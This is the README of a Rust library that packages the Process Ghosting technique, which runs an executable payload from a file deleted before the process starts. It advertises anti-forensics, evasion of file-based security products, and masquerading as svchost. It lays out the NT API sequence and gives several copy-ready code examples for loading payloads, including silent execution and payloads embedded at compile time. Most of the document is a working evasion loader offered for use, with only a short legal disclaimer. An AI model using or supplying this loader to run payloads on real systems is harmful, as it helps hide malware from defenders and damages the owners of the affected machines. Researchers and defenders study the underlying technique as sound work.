
# ProcessGhosting 👻

[![Crates.io](https://img.shields.io/crates/v/ProcessGhosting.svg)](https://crates.io/crates/ProcessGhosting)
[![Documentation](https://docs.rs/ProcessGhosting/badge.svg)](https://docs.rs/ProcessGhosting)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://github.com/BlackTechX011/ProcessGhosting/workflows/CI/badge.svg)](https://github.com/BlackTechX011/ProcessGhosting/actions)
[![Downloads](https://img.shields.io/crates/d/ProcessGhosting.svg)](https://crates.io/crates/ProcessGhosting)
[![Windows](https://img.shields.io/badge/platform-windows-blue.svg)](https://github.com/BlackTechX011/ProcessGhosting)

> **A Rust implementation of the Process Ghosting technique by BlackTechX**

Process Ghosting is an advanced code execution technique that allows running executable code without leaving traces on the filesystem. This library provides a safe, easy-to-use Rust API for implementing this technique.

---

## 📋 Table of Contents

- [What is Process Ghosting?](#-what-is-process-ghosting)
- [How It Works](#-how-it-works)
- [Technical Deep Dive](#-technical-deep-dive)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [API Reference](#-api-reference)
- [Examples](#-examples)
- [Hex Utilities](#-hex-utilities)
- [Architecture Support](#-architecture-support)
- [Building](#-building)
- [Security Considerations](#-security-considerations)
- [Credits](#-credits)
- [License](#-license)

---

## 👻 What is Process Ghosting?

Process Ghosting is a technique discovered by Gabriel Landau at Elastic Security. It exploits the Windows file system and process creation mechanisms to execute code from a file that no longer exists on disk.

### Key Features

| Feature | Description |
|---------|-------------|
| 🔒 **Fileless Execution** | Payload file is deleted before process starts |
| 🕵️ **Anti-Forensics** | No file remains on disk for security tools to scan |
| 🛡️ **Evasion** | Bypasses many file-based security products |
| 👤 **Stealth** | Process appears to run from a legitimate path |
| 🦀 **Pure Rust** | Safe, fast, and memory-efficient implementation |
| 📦 **Easy API** | Simple builder pattern for configuration |

---

## 🔬 How It Works

Process Ghosting exploits the Windows NT kernel's handling of delete-pending files:

```
┌─────────────────────────────────────────────────────────────────┐
│                    PROCESS GHOSTING FLOW                        │
└─────────────────────────────────────────────────────────────────┘

                    ┌──────────────┐
                    │    START     │
                    └──────┬───────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  1. Create temp file  │
               └───────────┬───────────┘
                           │
                           ▼
               ┌────────────────────────┐
               │ 2. Set delete-pending  │
               │ (NtSetInformationFile) │
               └───────────┬────────────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  3. Write PE payload  │
               │     to the file       │
               └───────────┬───────────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  4. Create SEC_IMAGE  │
               │   section from file   │
               └───────────┬───────────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  5. Close file handle │
               │  ⚠️ FILE DELETED! ⚠️ │
               └───────────┬───────────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  6. Create process    │
               │   from the section    │
               └───────────┬───────────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  7. Setup PEB and     │
               │  process parameters   │
               └───────────┬───────────┘
                           │
                           ▼
               ┌───────────────────────┐
               │  8. Create thread at  │
               │     entry point       │
               └───────────┬───────────┘
                           │
                           ▼
                 
                       RUNNING    
                    (No file! 👻)
                   
```

### The Magic Explained

1. **Delete-Pending State**: When a file is marked for deletion but still has an open handle, it enters a "delete-pending" state
2. **Section Creation**: Windows allows creating an image section from a delete-pending file
3. **File Deletion**: Once we close the file handle, the file is deleted from disk
4. **Process Creation**: The section (now without a backing file) can still be used to create a process

---

## 🔧 Technical Deep Dive

### NT API Functions Used

| Function | Purpose |
|----------|---------|
| `NtOpenFile` | Open temp file with DELETE permission |
| `NtSetInformationFile` | Mark file as delete-pending |
| `NtCreateSection` | Create SEC_IMAGE section |
| `NtCreateProcessEx` | Create process from section |
| `NtQueryInformationProcess` | Get PEB address |
| `RtlCreateProcessParametersEx` | Create process parameters |
| `NtAllocateVirtualMemory` | Allocate memory in target |
| `NtWriteVirtualMemory` | Write parameters to target |
| `NtCreateThreadEx` | Start execution |
| `RtlImageNtHeader` | Parse PE headers |

### Memory Layout

```
┌───────────────────────────────────────────────────┐
│                TARGET PROCESS MEMORY              │
├───────────────────────────────────────────────────┤
│                                                   │
│  ┌──────────────────────────────────────────────┐ │
│  │              MAPPED PE IMAGE                 │ │
│  ├──────────────────────────────────────────────┤ │
│  │  DOS Header (MZ)                             │ │
│  │  NT Headers                                  │ │
│  │    └─ OptionalHeader.AddressOfEntryPoint ────┼─┼──► Entry Point
│  │  Section Headers                             │ │
│  ├──────────────────────────────────────────────┤ │
│  │  .text   (Code)         ◄── Execution starts │ │
│  │  .rdata  (Read-only data)                    │ │
│  │  .data   (Initialized data)                  │ │
│  │  .rsrc   (Resources)                         │ │
│  └──────────────────────────────────────────────┘ │
│                                                   │
│  ┌──────────────────────────────────────────────┐ │
│  │                    PEB                       │ │
│  │  ├─ ImageBaseAddress                         │ │
│  │  └─ ProcessParameters                        | |
│  └──────────────────────────────────────────────┘ │
│                                      │            │
│  ┌───────────────────────────────────▼──────────┐ │
│  │       RTL_USER_PROCESS_PARAMETERS            │ │
│  │  ImagePathName: C:\Windows\System32\svchost  │ │
│  │  CommandLine: svchost.exe                    │ │
│  │  Environment: ...                            │ │
│  └──────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────┘
```

### Comparison with Other Techniques

| Technique | File on Disk During Execution | Detectable by File Scan | Complexity |
|-----------|------------------------------|------------------------|------------|
| **Process Ghosting** | ❌ No | ❌ No | ⭐⭐⭐ |
| Process Hollowing | ✅ Yes (legitimate) | ⚠️ Maybe | ⭐⭐ |
| Process Doppelgänging | ❌ No | ❌ No | ⭐⭐⭐⭐ |
| DLL Injection | ✅ Yes | ✅ Yes | ⭐⭐ |
| Reflective Loading | ❌ No | ⚠️ Memory scan | ⭐⭐⭐ |

---

## 📦 Installation

Add to your `Cargo.toml`:

```toml
[dependencies]
ProcessGhosting = "0.1"
```

Or using cargo:

```bash
cargo add ProcessGhosting
```

---

## 🚀 Quick Start

### Method 1: From File

```rust
use process_ghosting::{GhostingBuilder, init};

fn main() -> Result<(), String> {
    init();  // Print banner
    
    GhostingBuilder::from_file("payload.exe")?
        .x64()
        .with_logging()
        .execute()
}
```

### Method 2: From Bytes

```rust
use process_ghosting::GhostingBuilder;

fn main() -> Result<(), String> {
    let payload = std::fs::read("payload.exe").unwrap();
    
    GhostingBuilder::new(&payload)
        .x64()
        .execute()
}
```

### Method 3: From Hex String

```rust
use process_ghosting::GhostingBuilder;

fn main() -> Result<(), String> {
    let hex = "0x4D, 0x5A, 0x90, ...";  // Your payload
    
    GhostingBuilder::from_hex_string(hex)?
        .x64()
        .execute()
}
```

### Method 4: Embedded at Compile Time

```rust
use process_ghosting::GhostingBuilder;

const PAYLOAD: &[u8] = include_bytes!("../payload.exe");

fn main() -> Result<(), String> {
    GhostingBuilder::new(PAYLOAD)
        .x64()
        .silent()
        .execute()
}
```

### Method 5: Quick Functions

```rust
use process_ghosting::{ghost_payload_file, ghost_payload};

fn main() -> Result<(), String> {
    // From file
    ghost_payload_file("payload.exe")?;
    
    // From bytes
    let bytes = std::fs::read("payload.exe").unwrap();
    ghost_payload(&bytes)
}
```

---

## 📚 API Reference

### GhostingBuilder

Main builder for configuring process ghosting operations.

```rust
// Creation methods
GhostingBuilder::new(payload: &[u8]) -> Self
GhostingBuilder::from_file(path: &str) -> Result<Self, String>
GhostingBuilder::from_hex_string(hex: &str) -> Result<Self, String>
GhostingBuilder::from_hex_array(bytes: &[u8]) -> Self

// Configuration methods
.x64() -> Self                           // Target x64 (default)
.x86() -> Self                           // Target x86
.architecture(arch: Architecture) -> Self // Set architecture
.with_logging() -> Self                  // Enable verbose output
.silent() -> Self                        // Disable all output
.verbose(bool) -> Self                   // Set verbosity

// Execution
.build() -> GhostingConfig               // Get configuration
.execute() -> Result<(), String>         // Execute ghosting
```

### Quick Functions

```rust
// Execute with defaults (x64, verbose)
ghost_payload(payload: &[u8]) -> Result<(), String>

// Execute from file
ghost_payload_file(path: &str) -> Result<(), String>

// Execute from hex string
ghost_payload_hex(hex: &str) -> Result<(), String>

// Execute with architecture
ghost_payload_arch(payload: &[u8], arch: Architecture) -> Result<(), String>
```

### Architecture Enum

```rust
pub enum Architecture {
    X86,  // 32-bit
    X64,  // 64-bit (default)
}
```

---

## 🔢 Hex Utilities

### Convert EXE to Hex

```rust
use process_ghosting::{exe_to_hex_string, print_exe_hex};

// Get as string: "0x4D, 0x5A, 0x90, ..."
let hex = exe_to_hex_string("payload.exe")?;

// Print formatted for Rust code
print_exe_hex("payload.exe")?;
// Output:
// const PAYLOAD: &[u8] = &[
//     0x4D, 0x5A, 0x90, 0x00, ...
// ];
```

### Parse Hex Strings

All formats supported:

```rust
use process_ghosting::parse_hex_string;

// Continuous
parse_hex_string("4D5A9000")?;

// Space-separated  
parse_hex_string("4D 5A 90 00")?;

// C-style
parse_hex_string("0x4D, 0x5A, 0x90, 0x00")?;

// Escaped
parse_hex_string("\\x4D\\x5A\\x90\\x00")?;
```

### Utility Functions

```rust
// Read file as bytes
read_exe_bytes(path: &str) -> Result<Vec<u8>, String>

// Convert bytes to hex string
bytes_to_hex_string(bytes: &[u8]) -> String

// Convert file to formatted array
exe_to_hex_array(path: &str) -> Result<String, String>
```

---

## 📁 Examples

### Run Examples

```bash
# Basic usage
cargo run --example basic_usage

# From file with path argument
cargo run --example from_file -- payload.exe

# Convert EXE to hex
cargo run --example hex_converter -- print notepad.exe

# Full demo
cargo run --example full_demo
```

### Example: Basic Usage

```rust
use process_ghosting::{GhostingBuilder, init};

fn main() {
    init();
    
    match GhostingBuilder::from_file("payload.exe") {
        Ok(builder) => {
            match builder.x64().with_logging().execute() {
                Ok(_) => println!("[+] Success!"),
                Err(e) => println!("[-] Failed: {}", e),
            }
        }
        Err(e) => println!("[-] Load error: {}", e),
    }
}
```

### Example: Silent Execution

```rust
use process_ghosting::GhostingBuilder;

fn main() {
    let payload = std::fs::read("payload.exe").unwrap();
    
    let _ = GhostingBuilder::new(&payload)
        .x64()
        .silent()
        .execute();
}
```

### Example: Error Handling

```rust
use process_ghosting::GhostingBuilder;

fn main() {
    let result = GhostingBuilder::from_file("payload.exe")
        .and_then(|b| b.x64().execute());
    
    match result {
        Ok(_) => std::process::exit(0),
        Err(e) => {
            eprintln!("Error: {}", e);
            std::process::exit(1);
        }
    }
}
```

---

## 🏗️ Architecture Support

| Architecture | Status | Method |
|--------------|--------|--------|
| x64 (AMD64) | ✅ Supported | `.x64()` (default) |
| x86 (i386) | ✅ Supported | `.x86()` |
| ARM64 | ❌ Not yet | - |

---

## 🔨 Building

```bash
# Debug build
cargo build

# Release build
cargo build --release

# Build for 32-bit
cargo build --release --target i686-pc-windows-msvc

# Build for 64-bit
cargo build --release --target x86_64-pc-windows-msvc

# Run tests
cargo test

# Build docs
cargo doc --open
```

---

## ⚠️ Security Considerations

### Intended Use Cases

- ✅ Security research
- ✅ Red team operations  
- ✅ Penetration testing (authorized)
- ✅ Malware analysis
- ✅ Educational purposes

### Prohibited Uses

- ❌ Unauthorized system access
- ❌ Malware deployment
- ❌ Any illegal activities

### Legal Disclaimer

This software is provided for educational and authorized security research purposes only. The author is not responsible for any misuse. Users must ensure compliance with all applicable laws.

---

## 🙏 Credits

- **Gabriel Landau** (Elastic Security) - Original Process Ghosting research.
- **Offensive Panda** (Github: @offensive-panda) - Process Ghosting in c.
- **BlackTechX** - Rust implementation

---

## 📄 License

MIT License - See [LICENSE](LICENSE) file.

---

## 🔗 Links

- [Crates.io](https://crates.io/crates/ProcessGhosting)
- [Documentation](https://docs.rs/ProcessGhosting)
- [GitHub Repository](https://github.com/BlackTechX011/ProcessGhosting)
- [Original Research](https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack)

---

<p align="center">
  <b>Made with 👻 by BlackTechX</b>
</p>
